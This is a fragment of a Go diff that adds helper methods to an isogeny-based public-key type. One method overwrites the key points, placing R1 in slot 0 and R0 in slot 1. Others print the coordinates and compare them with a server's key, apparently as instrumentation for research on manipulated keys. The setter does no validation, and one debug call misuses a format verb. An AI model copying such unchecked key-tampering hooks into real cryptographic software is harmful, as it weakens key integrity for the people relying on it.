++func (pub *PublicKey) Modify_PublicKey(x_R0, x_R1, x_R2 common.Fp2) {
++	pub.affine3Pt[0] = x_R1
++	pub.affine3Pt[1] = x_R0
++	pub.affine3Pt[2] = x_R2
++}
++
++// Code from Yingchen
++func (pub *PublicKey) Print_PublicKey() {
++	for i := 0; i < 12; i++ {
++		fmt.Printf("0x%x,", pub.affine3Pt[0].A[i])
++	}
++	fmt.Printf("\n")
++	for i := 0; i < 12; i++ {
++		fmt.Printf("0x%x,", pub.affine3Pt[0].B[i])
++	}
++	fmt.Printf("\n")
++	for i := 0; i < 12; i++ {
++		fmt.Printf("0x%x,", pub.affine3Pt[1].A[i])
++	}
++	fmt.Printf("\n")
++	for i := 0; i < 12; i++ {
++		fmt.Printf("0x%x,", pub.affine3Pt[1].B[i])
++	}
++	fmt.Printf("\n")
++	for i := 0; i < 12; i++ {
++		fmt.Printf("0x%x,", pub.affine3Pt[2].A[i])
++	}
++	fmt.Printf("\n")
++	for i := 0; i < 12; i++ {
++		fmt.Printf("0x%x,", pub.affine3Pt[2].B[i])
++	}
++	fmt.Printf("\n")
++}
++
++// Code from Yingchen
++func (pub *PublicKey) Compare_PublicKey(public_key_server_pt0, public_key_server_pt1, public_key_server_pt2 common.Fp2) int {
++	fmt.Println("pk affine3Pt 0 %v", pub.affine3Pt[0])
++	fmt.Println("pk affine3Pt 1 %v", pub.affine3Pt[1])
++	fmt.Println("pk affine3Pt 2 %v", pub.affine3Pt[2])
++	if (pub.affine3Pt[0] == public_key_server_pt0) && (pub.affine3Pt[1] == public_key_server_pt1) && (pub.affine3Pt[2] == public_key_server_pt2) {
++		return 1
++	}
++	return 0
++}
++
+ // Import clears content of the public key currently stored in the structure
+ // and imports key stored in the byte string. Returns error in case byte string
+ // size is wrong. Doesn't perform any validation.
